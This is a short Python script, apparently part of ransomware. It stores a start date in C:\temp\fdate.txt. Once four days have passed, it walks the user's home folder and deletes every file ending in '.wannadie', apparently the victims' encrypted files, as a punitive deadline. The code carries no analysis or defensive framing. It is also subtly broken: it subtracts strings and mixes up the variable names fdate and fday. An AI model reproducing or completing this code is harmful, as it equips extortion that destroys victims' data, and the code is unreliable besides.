from datetime import date
import os

def files2crypt(path):
    allFiles = []
    for root, subfiles, files in os.walk(path):
        for names in files:
            allFiles.append(os.path.join(root, names))
    return allFiles

try:
    with open('C:\\temp\\fdate.txt', 'r') as in_file:
        fday = in_file.read()
        in_file.close()    
except:
    fdate = date.today().strftime("%d")
    with open('C:\\temp\\fdate.txt','w') as in_file:
        in_file.write(fdate)
        in_file.close()
else:
    data = date.today().strftime("%d")
    restante = data-fday
    if restante >= 4:
        enc_files = files2crypt('C:\\Users\\{}'.format(os.getenv('username')))
        for file_pnt in enc_files:
            if os.path.basename(file_pnt).endswith(".wannadie"):
                os.remove(str(file_pnt))
            else:
                pass
